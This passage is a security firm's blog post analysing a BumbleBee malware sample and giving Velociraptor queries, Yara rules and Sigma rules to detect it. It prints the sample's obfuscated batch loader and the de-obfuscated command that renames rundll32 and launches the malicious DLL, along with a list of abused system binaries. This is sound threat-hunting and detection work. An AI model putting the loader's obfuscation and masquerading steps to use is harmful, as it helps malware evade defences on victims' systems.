                            </div></a></nav></div></header><section role="main" itemprop="mainContentOfPage"><div class="content-wrapper"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://sec-consult.com/blog/","name":"Blog"}}]}</script><nav class="breadcrumbs-container" aria-label="Breadcrumb"><ol class="breadcrumbs"><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/" target="">
                                Home
                            </a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/blog/" target="">
                                Blog
                            </a></li><li class="breadcrumbs__item"><span class="breadcrumbs__text">BumbleBee hunting with a Velociraptor</span></li></ol></nav><!--TYPO3SEARCH_begin--><section class="section section__news_newsdetail"><div id="c42" class="frame frame-default frame-type-news_newsdetail frame-layout-0"><div class="news news-single"><div class="article" itemscope="itemscope" itemtype="http://schema.org/Article"><div class="news-detail news-detail--default"><div class="news-detail__top"><h1 itemprop="headline">BumbleBee hunting with a Velociraptor</h1><time class="news-detail__date" itemprop="datePublished"
                      datetime="2023-04-11">
                    11.04.2023
                </time><!-- categories --><span class="news-list-category">
	
		
				research
			
	
</span><div class="news-detail__teaser news-detail__teaser--no-container" itemprop="description"><p>BumbleBee, a malware which is mainly abused by threat actors in data exfiltration and ransomware incidents, was recently analyzed by Angelo Violetti of SEC Defence - the SEC Consult Digital Forensics and Incident Response team. </p></div><figure class="news-detail__figure"><picture><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_ea16a1bb8b.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_f9f9f8cd8e.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_c01149d783.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_064ff9d7dd.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-h-velociraptor-bumblebee.jpg" type="image/jpg" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-h-velociraptor-bumblebee.jpg" type="image/jpg" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_7e67b4c369.jpg" type="image/jpg" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/1/e/csm_sec-consult-h-velociraptor-bumblebee_2ce8a71b8f.jpg" type="image/jpg" media="(min-width: 100px)"><img class="news-detail__img" loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-h-velociraptor-bumblebee.jpg" width="964" height="560" alt="" /></picture></figure></div><div class="news-detail__text" itemprop="articleBody"><p class="MsoBodyText">During his research, he used several tools and techniques to define ways to detect the presence of BumbleBee on a compromised infrastructure.</p><p class="MsoBodyText">The various detection opportunities described in the report can be useful for organizations to detect an infection in its first stages and, therefore, prevent further malicious activity starting from BumbleBee. The detection opportunities rely on open-source tools (e.g., Velociraptor) and rules (e.g., Yara, Sigma) so they can be used by any company or the wider community.</p><p class="MsoBodyText">SEC Defence offers Threat Hunting and Incident Response services to support clients in promptly detecting and responding to cyber threats such as BumbleBee. To request immediate support in case of a potential incident or breach, <a href="https://sec-consult.com/incident-response/sec-defence/" target="_blank">get in touch with SEC Defence</a>.&nbsp;</p><h2 class="MsoBodyText">Introduction</h2><p class="MsoBodyText"><strong>Ransomware</strong> attacks, combined with <strong>data exfiltration</strong>, are one of the <strong>most relevant cyber threats</strong> for companies worldwide, as reported by the <a href="https://www.enisa.europa.eu/publications/enisa-threat-landscape-2022" target="_blank" rel="noreferrer">Enisa Threat Landscape 2022</a>. According to the <a href="https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf" target="_blank" rel="noreferrer">NIST's Incident Handling guide</a>, the prevention and detection phases of those types of attacks can be crucial to minimize the potential incident's impacts (e.g., operational, legal, etc.).</p><p class="MsoBodyText">To gain initial access into a victim’s infrastructure, ransomware operators abuse mostly the following techniques:</p><ul class="list-normal"><li class="MsoBodyText"><strong>Phishing campaigns</strong>, also conducted by initial access brokers<sup>1</sup>, that deliver malware which acts as a loader for subsequent post-exploitation frameworks like Cobalt Strike or Meterpreter.</li><li class="MsoBodyText"><strong>Exposed vulnerable services</strong> that can be exploited to execute arbitrary commands remotely.</li><li class="MsoBodyText"><strong>Compromised accounts</strong> that allow the threat actor to login into services like VPN.</li></ul><p class="MsoBodyText">One of the newest malware families, first discovered by the <a href="https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/" target="_blank" rel="noreferrer">Google Threat Analysis Group</a> in 2021, and delivered by initial access brokers is called BumbleBee and it has been used by the well-known Russian group <em>Wizard Spider</em> which has been <a href="https://blog.bushidotoken.net/2022/11/the-continuity-of-conti.html" target="_blank" rel="noreferrer">linked to ransomware</a> like Conti, Quantum, Royal, etc.</p><p class="MsoBodyText">In this article, SEC Defence shows the analysis that has been performed of a BumbleBee sample and provides some threat hunting methods to detect BumbleBee techniques.</p><h2 class="MsoBodyText">BumbleBee</h2><p class="MsoBodyText"><a href="https://attack.mitre.org/software/S1039/" target="_blank" rel="noreferrer">BumbleBee</a> is commonly distributed via malicious ISO images. and abuses thread-hijacking emails to induce the victims to download the ISO file and subsequently open it. When executed, BumbleBee performs mainly the following actions:</p><ul class="list-normal"><li class="MsoBodyText">Verifies if it is running in an analysis or sandboxing environment by performing various checks like enumerating the registry keys and drivers related to VMware or VirtualBox.</li><li class="MsoBodyText">Gathers information about the compromised system through WMI queries.</li><li class="MsoBodyText">Connects to the command and control (C2) servers embedded into the malware configuration that is RC4 encrypted.</li></ul><p class="MsoBodyText">Furthermore, BumbleBee can also receive specific commands from the threat actors that can be useful for further malicious actions like achieving persistence and downloading other malware (e.g., Cobalt Strike).</p><p>&nbsp;</p><p class="MsoFootnoteText">&nbsp;</p></div><section class="section section__text"><div id="c3996" class="frame frame-default frame-type-text frame-layout-0"><h3>Malware Analysis &amp; Detection</h3><p class="MsoBodyText">The BumbleBee sample analyzed is the following ISO file, which is available on <a href="https://bazaar.abuse.ch/verify-ua/#comments" target="_blank" rel="noreferrer">Malware Bazaar</a>.</p></div></section><section class="section section__table"><div id="c3995" class="frame frame-default frame-type-table frame-layout-0"><table class="w-full max-w-full overflow-auto"><tbody><tr class=""><td class="py-2 px-2">
                            
                    
            
    


        File name
    

        
                
                        
                                </td><td class="py-2 px-2">
                    
            
    


        Required Documents.img
    

        
                
                        </td></tr><tr class=""><td class="py-2 px-2">
                    
            
    


        MD5
    

        
                
                        </td><td class="py-2 px-2">
            
    


        016eae588e2e565414259280ba4f6753
    

        
                </td></tr><tr class=""><td class="py-2 px-2">
                    
            
    


        SHA1
    

        
                
                        </td><td class="py-2 px-2">
            
    


        6983820a0d115bb78290ce9fbd6543623281d3d1
    

        
                </td></tr><tr class=""><td class="py-2 px-2">
                    
            
    


        SHA256
    

        
                
                        </td><td class="py-2 px-2">
            
    


        127b3506b7da4569cbdf23bb500bb95832e1a8d4fcec5e2ce6ec9e0c973ba36b
    

        
                </td></tr></tbody></table></div></section><section class="section section__textpic"><div id="c3998" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_90205e4497.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_fc2be3e0b4.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_ebd648214d.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_282620e1ad.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_4f9a534a5c.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_6485c818ce.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_5e15190bee.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_1d0789969e.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_7cbcc01490.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/0/4/csm_sec-consult-c-Image_1_0fb9158a88.png" width="1100" height="285" alt="BumbleBee Execution Process" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>BumbleBee Execution Process</h4></div></div></div></section><section class="section section__textpic"><div id="c3999" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_08cddfe126.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_7eead4a223.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_02f1162bc0.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_0b76c4a29c.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_e6a3b44d6a.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_210951b2cb.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_6cb095f1b0.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_d9c9e8d144.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_c0bd807de7.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/b/e/csm_sec-consult-c-Image_2_80a4c107bc.png" width="1100" height="171" alt="LNK files" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p class="MsoBodyText">The ISO file analyzed contained three files, two hidden and one visible LNK file.</p></div></div></div></section><section class="section section__text"><div id="c4000" class="frame frame-default frame-type-text frame-layout-0"><p class="MsoBodyText">When opened, the LNK file launches cmd.exe to execute the hidden BAT file.</p><pre><code>C:\Windows\System32\cmd.exe /c case_studies.bat</code></pre><p>&nbsp;</p></div></section><section class="section section__text"><div id="c4001" class="frame frame-default frame-type-text frame-layout-0"><p class="MsoBodyText">The threat actors slightly obfuscated the BAT file by assigning a unique string to every letter of the alphabet to hide the executed final command.</p><p class="MsoBodyText">Obfuscated BAT file:</p><pre><code>@echo off
:ywthnwxyyek
set ugfmhz=a
:dykxmzumupg
set zjxchb=b
:ibbnmbrapbc
set c=c
:ndtdmdoplmy
set d=d
:gnczycxqkhn
set e=e
:lqupyfuegsj
set f=f
:qslfyhrtbde
set g=g
:vvcvyjohxoa
set h=h
:ofmqjjxjwjp
set i=i
:thdgjluxsul
set j=j
:ykvwjnrlngh
set k=k
:dmmnjqpajrd
set l=l
:wxwivpxbimr
set m=m
:bznyurvpexn
set n=n
:gceoutseaij
set o=o
:leweuwpsvtf
set p=p
:eofagvytuou
set q=q
:jrxqgxviqzq
set r=r
:otoggaswmkl
set s=s
:twgwgcplhwh
set t=t
:lgprrbymgqw
set u=u
:rigirdvaccs
set v=v
:wlyyrgspyno
set w=w
:bnporipdtyk
set x=x
:txzjdhyestz
set y=y
:yaqzckvtoeu
set z=z
:zogksw
%c%%m%%d%.%e%%x%%e% /%c% %s%%t%%a%%r%%t% /%b% /%m%%i%%n% %c%%o%%p%%y% /Y C:\W%i%%n%%d%%o%%w%%s%\S%y%%s%%t%%e%%m%32\%r%%u%%n%%d%%l%%l%32.%e%%x%%e% C:\P%r%%o%%g%%r%%ugfmhz%%m%D%ugfmhz%%t%%ugfmhz%\ESMS3%u%Y%s%%y%N%q%2%s%.%e%%x%%e% &amp;&amp; %s%%t%%ugfmhz%%r%%t% /%zjxchb% /%m%%i%%n% C:\P%r%%o%%g%%r%%ugfmhz%%m%D%ugfmhz%%t%%ugfmhz%\ESMS3%u%Y%s%%y%N%q%2%s%.%e%%x%%e% %n%%e%%t%%w%%o%%r%%k%.%d%%l%%l%,C%o%%n%%d%%e%%n%%s%%e%%d% &amp;&amp; %e%%x%%i%%t%
</code></pre><p class="MsoBodyText">By de-obfuscating the BAT file, it is possible to see that it copies the rundll32 executable into the ProgramData directory and then launches the BumbleBee DLL (network.dll).</p><p class="MsoBodyText">De-obfuscated BAT file:</p><pre><code>cmd.exe /c start /b /min copy /Y C:\Windows\System32\rundll32.exe C:\ProgramData\ESMS3uYsyNq2s.exe &amp;&amp; start /b /min C:\ProgramData\ESMS3uYsyNq2s.exe network.dll,Condensed &amp;&amp; exit</code></pre><h3><br> Defense Evasion: Mark-of-the-Web Bypass</h3><p class="MsoBodyText">BumbleBee abuses ISO images to evade a Windows mechanism called <em><a href="https://attack.mitre.org/techniques/T1553/005/" target="_blank" rel="noreferrer">Mark-of-the-Web</a></em>. Such a mechanism tracks, through a hidden NTFS Alternate Data Stream (ADS) named <em>Zone.Identifiers, </em>files downloaded from the Internet which trigger security measures on the tracked files.</p></div></section><section class="section section__textpic"><div id="c4002" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_f515466991.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_4311c7bf19.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_60a0f7961d.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_1d80be2395.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_7a50b5c332.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_836b4a39be.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_b996d02a1e.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_06ac801641.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_1a2b868b03.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_3_af249c053f.png" width="1100" height="215" alt="Identification of the BumbleBee ISO image mounting" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>Velociraptor</h4><p class="MsoBodyText">The Velociraptor artifact called <em>Windows.Detection.ISOMount </em>can be used to search for ISO files mounted this activity is tracked in the Windows Event Logs with EventID<em> 22</em>.</p><p class="MsoBodyText">The following image shows the identification of the BumbleBee ISO image mounting.</p></div></div></div></section><section class="section section__textpic"><div id="c4003" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_32a8487f28.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_cc0055adab.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_cf2ef39c52.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_689a6e4d38.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_b534e2da0e.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_4701c70192.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_b4fa239495.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_a551ed0e9b.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_e723b654ef.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/4/a/csm_sec-consult-c-Image_4_9a67be34e8.png" width="1100" height="233" alt="Identification of technique through Velociraptor" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h3>Masquerading: Rename System Utilities Detection</h3><p class="MsoBodyText">The technique used by the BAT file is called <em><a href="https://attack.mitre.org/techniques/T1036/003/" target="_blank" rel="noreferrer">Rename System Utilities</a>&nbsp;</em>and consists of copying itself into a specific folder, modifying the name of the executable in order to evade security mechanisms.</p><h4>Velociraptor</h4><p class="MsoBodyText">Velociraptor natively offers an artifact named <em>Windows.Detection.BinaryRename </em>to hunt for known executables that are copied and re-named by threat actors.</p><pre><code>SELECT * FROM source(artifact="Windows.Detection.BinaryRename") WHERE VersionInformation.OriginalFilename =~ "rundll32"</code></pre><p class="MsoBodyText">The following image shows the identification of this technique through Velociraptor.</p></div></div></div></section><section class="section section__textpic"><div id="c4004" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_0bfc9a563e.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_f2e661aa61.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_3a6cd27ef8.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_c3d8a4185f.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_383371a1ca.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_b51d2e688a.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_bf583c93a8.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_882a3c320b.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_52a1325f22.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/3/2/csm_sec-consult-c-Image_5_bd651c28aa.png" width="1100" height="269" alt="Windows Event Logs" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>Windows Event Logs</h4><p class="MsoBodyText">By looking at Sysmon<sup>2</sup> Event ID 1, we notice that the <em>OriginalFileName</em> value does not match the executable name specified in the <em>Image </em>value.</p><p>&nbsp;</p><p class="MsoFootnoteText">&nbsp;</p></div></div></div></section><section class="section section__text"><div id="c4005" class="frame frame-default frame-type-text frame-layout-0"><p class="MsoBodyText">Therefore, it is possible to hunt for this pattern also through the following Sigma rule:</p><pre><code>[…]
detection:
    selection:
        - Description: 'Execute processes remotely'
        - Product: 'Sysinternals PsExec'
        - Description|startswith:
            - 'Windows PowerShell'
            - 'pwsh'
        - OriginalFileName:
            - 'powershell.exe'
            - 'pwsh.dll'
            - 'powershell_ise.exe'
            - 'psexec.exe'
            - 'psexec.c'        # old versions of psexec (2016 seen)
            - 'psexesvc.exe'
            - 'cscript.exe'
            - 'wscript.exe'
            - 'mshta.exe'
            - 'regsvr32.exe'
            - 'wmic.exe'
            - 'certutil.exe'
            - 'rundll32.exe'
            - 'cmstp.exe'
            - 'msiexec.exe'
            - 'reg.exe'
[…]
</code></pre><p class="MsoBodyText"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml" target="_blank" rel="noreferrer">The full Sigma rule can be found here.</a></p><h3 class="MsoBodyText">Execution: System Binary Proxy Execution Detection</h3><p class="MsoBodyText">BumbleBee executes the malicious DLL through Rundll32 with the aim to hide the malware from security applications.</p><h4>Velociraptor</h4><p class="MsoBodyText">SEC Defence has created the following Yara rule that can be used to detect running BumbleBee processes through the Velociraptor artifact <em>Windows.Detection.Yara.Process</em>.</p><pre><code>rule BumbleBee_Unpacked{
	meta:
		author = "Angelo Violetti (SEC Consult - SEC Defence)"
		date = "2023-02-23"
		description = "Rule to detect BumbleBee in memory"
		reference = "https://sec-consult.com/incident-response/sec-defence/"

	strings:

		/*
			$s1

			mov     rax, [rbx+10h]
			cmp     qword ptr [rbx+18h], 10h
			jb      short loc_18000738F
			mov     rbx, [rbx]
			mov     r8d, eax
			mov     rdx, rbx
			lea     rcx, [rsp+148h+array]
			call    mw_rc4_ksa_wrapper
			nop

			$s2

			mov     r8d, 0FFFh
			lea     rdx, mw_encrypted_config
			lea     rcx, [rsp+148h+array]
			call    mw_rc4_decrypt_wrapper
			nop

			$s3
			lea     rcx, [rsp+148h+array]
			call    mw_return
		*/

		$s1 = {?? 83 ?? 18 10 72 03 ?? 8B ?? 44 8B ?? 48 8B ?? 48 8D 4C 24 30 E8 ?? ?? FF FF 90}

		$s2 = {48 8D 4C 24 30 E8 ?? ?? FF FF 90}

		$s3 = {48 8D 4C 24 30 E8 ?? ?? FF FF}

	condition:
		all of ($s*)
}
</code></pre><p>&nbsp;</p></div></section><section class="section section__textpic"><div id="c4006" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_55c9f1f79f.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_910e722624.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_82dfcaee75.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_12a715aa0a.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_f5c46fd2be.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_5ec3106d63.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_c28ee39f09.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_838208fdf8.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_ec275d23c1.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/c/c/csm_sec-consult-c-Image_6_ed6213ad0b.png" width="1100" height="279" alt="Identification of BumbleBee processes through SEC Defence Yara rule and Velociraptor." /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p class="MsoBodyText">The Yara rule is based on the operations performed by the malware when decrypts its embedded configuration containing the command and control servers.</p><p class="MsoBodyText">The following image shows the identification of BumbleBee processes through SEC Defence Yara rule and Velociraptor.</p></div></div></div></section><section class="section section__textpic"><div id="c4007" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_3a34857b7b.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_43419a37ce.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_e5b040410c.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_41bcc7c552.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_9148971a07.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_be14d78120.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_8c85dc00c1.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_3ec24eb4eb.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_e3bfbe82b6.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/b/2/csm_sec-consult-c-Image_7_ef7451926e.png" width="1100" height="325" alt="Sysmon Event ID 1" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h4>Windows Event Logs</h4><p>Since at time of execution BumbleBee DLL is located on the mounted ISO file, when rundll32.exe is executed, its current directory is set to the external drive, as shown by the following Sysmon Event ID 1.</p></div></div></div></section><section class="section section__textpic"><div id="c4008" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_680f303eee.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_2fd741c9bf.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_278b22af3f.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_78b2c3c627.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_1e5df87a08.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_bf8b894adc.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_6b336fbf11.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_4eeb6bec2f.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_e83d302f7c.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/6/f/csm_sec-consult-c-Image_8_bcb722baab.png" width="1100" height="1005" alt="Application Layer Protocol" /></picture></a></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p class="MsoBodyText">To detect this behaviour, SEC Defence has defined the following Sigma rule:</p><pre><code>title: Suspicious Rundll32 with Current Directory an External Drive
ruletype: Sigma
author: Angelo Violetti (SEC Consult - SEC Defence)
date: 2023/03/01
description: Detects the execution of rundll32.exe and the current directory is not C
reference: <a href="https://sec-consult.com/incident-response/sec-defence/" target="_blank">sec-consult.com/incident-response/sec-defence/</a>
id: aaff35da-bcee-11ed-afa1-0242ac120002
status: experimental
tags:
    - attack.defenseevasion
    - attack.T1553.005
logsource:
  category: process_creation
  product: windows
detection:
    SELECTION_1:
        OriginalFileName: 'rundll32.exe'
    SELECTION_2:
        CurrentDirectory|startswith: 'C:\\'
    condition: SELECTION_1 and not SELECTION_2
level: medium
</code></pre><h3><br> Command &amp; Control: Application Layer Protocol</h3><p class="MsoBodyText">After compromising the victim's workstation, BumbleBee contacts the C2 servers that are RC4 encrypted in the binary. By analyzing the process memory, it is possible to notice various IP addresses followed by a destination port, however, only a part of them is associated with port 443 (HTTPS) and are actually used as a C2.</p></div></div></div></section><section class="section section__textpic"><div id="c4009" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-c-Image_9.png" class="lightbox"
